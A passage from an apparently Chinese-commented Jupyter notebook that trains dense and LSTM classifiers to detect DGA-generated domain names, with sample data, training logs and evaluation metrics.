</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>length</th>
      <th>class</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td>youtube</td>
      <td>7</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>1</th>
      <td>facebook</td>
      <td>8</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>2</th>
      <td>wikipedia</td>
      <td>9</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>3</th>
      <td>instagram</td>
      <td>9</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>4</th>
      <td>twitter</td>
      <td>7</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>5</th>
      <td>blogspot</td>
      <td>8</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>6</th>
      <td>netflix</td>
      <td>7</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>7</th>
      <td>pornhub</td>
      <td>7</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>8</th>
      <td>xvideos</td>
      <td>7</td>
      <td>legit</td>
    </tr>
    <tr>
      <th>9</th>
      <td>livejasmin</td>
      <td>10</td>
      <td>legit</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">all_domains.tail(10)
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>length</th>
      <th>class</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>9990</th>
      <td>mxepwpxki</td>
      <td>9</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>9991</th>
      <td>xnvqgaddhivrqowtbs</td>
      <td>18</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>9992</th>
      <td>btgjyoydcwoeigdldngr</td>
      <td>20</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>9993</th>
      <td>mnnridfyhxkyk</td>
      <td>13</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>9994</th>
      <td>jmcctiodbdemfejo</td>
      <td>16</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>9995</th>
      <td>mepoiwtmeffy</td>
      <td>12</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>9996</th>
      <td>iwpikrmppfqeere</td>
      <td>15</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>9997</th>
      <td>gcibdmrs</td>
      <td>8</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>9998</th>
      <td>tusdspujigdyntbxusuah</td>
      <td>21</td>
      <td>dga</td>
    </tr>
    <tr>
      <th>9999</th>
      <td>wvsiuqhblxfijnoefjnao</td>
      <td>21</td>
      <td>dga</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">X = all_domains[&#39;domain&#39;]
labels = all_domains[&#39;class&#39;]
</code></pre>

<pre><code class="language-python">ngram_vectorizer = feature_extraction.text.CountVectorizer(analyzer=&#39;char&#39;, ngram_range=(2, 2))
count_vec = ngram_vectorizer.fit_transform(X)
max_features = count_vec.shape[1]
</code></pre>

<pre><code class="language-python">y = [0 if x == &#39;legit&#39; else 1 for x in labels]
</code></pre>

<pre><code class="language-python">final_data = []
</code></pre>

<h4 id="toc_0">多层感知机（MLP）</h4>

<pre><code class="language-python">def build_model(max_features):
    model = Sequential()
    model.add(Dense(1, input_dim=max_features, activation=&#39;sigmoid&#39;))
    #添加一个全连接层，激活函数使用sigmoid，输出维度max_features
    model.compile(loss=&#39;binary_crossentropy&#39;,optimizer=&#39;adam&#39;)
    #编译模型，损失函数采用对数损失函数，优化器选用adam
    return model
</code></pre>

<pre><code class="language-python">max_epoch = 50
nfolds = 10
#10轮训练
batch_size = 128
</code></pre>

<pre><code class="language-python">for fold in range(nfolds):
    print(&quot;fold %u/%u&quot; % (fold+1, nfolds))
    X_train, X_test, y_train, y_test, _, label_test = train_test_split(count_vec, y, labels, test_size=0.2)

    print(&#39;Build model...&#39;)
    model = build_model(max_features)

    print(&quot;Train...&quot;)
    X_train, X_holdout, y_train, y_holdout = train_test_split(X_train, y_train, test_size=0.05)
    best_iter = -1
    best_auc = 0.0
    out_data = {}

    for ep in range(max_epoch):
        model.fit(X_train.todense(), y_train, batch_size=batch_size, nb_epoch=1)
        t_probs = model.predict_proba(X_holdout.todense())
        t_auc = sklearn.metrics.roc_auc_score(y_holdout, t_probs)
        #计算AUC值

        print(&#39;Epoch %d: auc = %f (best=%f)&#39; % (ep, t_auc, best_auc))
        if t_auc &gt; best_auc:
            best_auc = t_auc
            best_iter = ep

            probs = model.predict_proba(X_test.todense())
            out_data = {&#39;y&#39;:y_test, &#39;labels&#39;: label_test, &#39;probs&#39;:probs, &#39;epochs&#39;: ep,
                            &#39;confusion_matrix&#39;: sklearn.metrics.confusion_matrix(y_test, probs &gt; .5)}
            print(sklearn.metrics.confusion_matrix(y_test, probs &gt; .5))
        else:
            if (ep-best_iter) &gt; 5:
                break

    final_data.append(out_data)
    model.save(&#39;model.h5&#39;)
</code></pre>

<pre><code class="language-text">fold 1/10
Build model...
Train...


/usr/lib/python3/dist-packages/ipykernel_launcher.py:15: UserWarning: The `nb_epoch` argument in `fit` has been renamed `epochs`.
  from ipykernel import kernelapp as app


Epoch 1/1
7600/7600 [==============================] - 1s 86us/step - loss: 0.6297
Epoch 0: auc = 0.950239 (best=0.000000)
[[915  86]
 [108 891]]
Epoch 1/1
7600/7600 [==============================] - 0s 26us/step - loss: 0.5243
Epoch 1: auc = 0.980196 (best=0.950239)
[[952  49]
 [ 83 916]]
Epoch 1/1
7600/7600 [==============================] - 0s 31us/step - loss: 0.4502
Epoch 2: auc = 0.984872 (best=0.980196)
[[965  36]
 [ 78 921]]
Epoch 1/1
7600/7600 

Epoch 32: auc = 0.994192 (best=0.994192)
</code></pre>

<pre><code class="language-python">model = load_model(&#39;model.h5&#39;)
</code></pre>

<pre><code class="language-python">print(final_data)
</code></pre>

<pre><code class="language-text">[{&#39;y&#39;: [0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1], &#39;labels&#39;: 2403    legit
2789    legit
450     legit
4521    legit
2841    legit
8645      dga
6999      dga
7831      dga
6291      dga
3746    legit
6226      dga
4111    legit
8487      dga
678     legit
90      legit
6151      dga
8300      dga
4004    legit
2489    legit
4836    legit
8291      dga
8198      dga
8911      dga
7585      dga
260     legit
5905      dga
5646      dga
970     legit
8718      dga
275     legit
        ...  
8589      dga
6620      dga
7470      dga
5230      dga
4827    legit
5677      dga
3417    legit
8539      dga
7147      dga
3699    legit
4751    legit
3043    legit
5475      dga
3736    legit
3887    legit
6349      dga
4996    legit
7379      dga
3530    legit
1942    legit
7914      dga
9752      dga
6717      dga
5363      dga
7622      dga
961     legit
1641    legit
4607    legit
8649      dga
6087      dga
Name: class, Length: 2000, dtype: object, &#39;probs&#39;: array([[0.14488636],
       [0.00496732],
       [0.00896166],
       ...,
       [0.00593334],
       [0.95598286],
       [0.9867235 ]], dtype=float32), &#39;epochs&#39;: 43, &#39;confusion_matrix&#39;: array([[972,  29],
       [ 62, 937]])}
</code></pre>

<pre><code class="language-python">z_test = np.array([[0, 0, 0, 0, 0,  0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1]])
model.predict(z_test)
</code></pre>

<pre><code class="language-text">array([[1.]], dtype=float32)
</code></pre>

<pre><code class="language-python">print(sklearn.metrics.classification_report(final_data[0][&#39;y&#39;], final_data[0][&#39;probs&#39;] &gt; .5))
</code></pre>

<pre><code class="language-text">              precision    recall  f1-score   support

           0       0.95      0.97      0.96       970
           1       0.97      0.95      0.96      1030

   micro avg       0.96      0.96      0.96      2000
   macro avg       0.96      0.96      0.96      2000
weighted avg       0.96      0.96      0.96      2000
</code></pre>

<h4 id="toc_1">LSTM</h4>

<pre><code class="language-python">def build_model_lstm(max_features, maxlen):
    &quot;&quot;&quot;Build LSTM model&quot;&quot;&quot;
    model = Sequential()
    model.add(Embedding(max_features, 128, input_length=maxlen))
    #添加一个嵌入层，嵌入层是将正整数（下标）转换为具有固定大小的向量
    model.add(LSTM(128))
    #添加长短期记忆网络LSTM，从样本中学习特征，这个是核心层
    model.add(Dropout(0.5))
    #添加Dropout层防止过拟合
    model.add(Dense(1))
    model.add(Activation(&#39;sigmoid&#39;))

    model.compile(loss=&#39;binary_crossentropy&#39;, optimizer=&#39;rmsprop&#39;)
    #编译模型，损失函数采用对数损失函数，优化器选用rmsprop

    return model
</code></pre>

<pre><code class="language-python">X = all_domains[&#39;domain&#39;]
labels = all_domains[&#39;class&#39;]

valid_chars = {x:idx+1 for idx, x in enumerate(set(&#39;&#39;.join(X)))}
max_features = len(valid_chars) + 1
#计算特征字符长度
maxlen = np.max([len(x) for x in X])
#记录最长的域名长度
X = [[valid_chars[y] for y in x] for x in X]
#转换为下标数组
X = sequence.pad_sequences(X, maxlen=maxlen)
#进行长度填充
y = [0 if x == &#39;legit&#39; else 1 for x in labels]
final_data = []
</code></pre>

<pre><code class="language-python">for fold in range(nfolds):
    print(&quot;fold %u/%u&quot; % (fold+1, nfolds))
    X_train, X_test, y_train, y_test, _, label_test = train_test_split(X, y, labels, 
                                                                           test_size=0.2)

    print(&#39;Build model...&#39;)
    model = build_model_lstm(max_features, maxlen)

    print(&quot;Train...&quot;)
    X_train, X_holdout, y_train, y_holdout = train_test_split(X_train, y_train, test_size=0.05)
    best_iter = -1
    best_auc = 0.0
    out_data = {}

    for ep in range(max_epoch):
        model.fit(X_train, y_train, batch_size=batch_size, nb_epoch=1)

        t_probs = model.predict_proba(X_holdout)
        t_auc = sklearn.metrics.roc_auc_score(y_holdout, t_probs)

        print(&#39;Epoch %d: auc = %f (best=%f)&#39; % (ep, t_auc, best_auc))

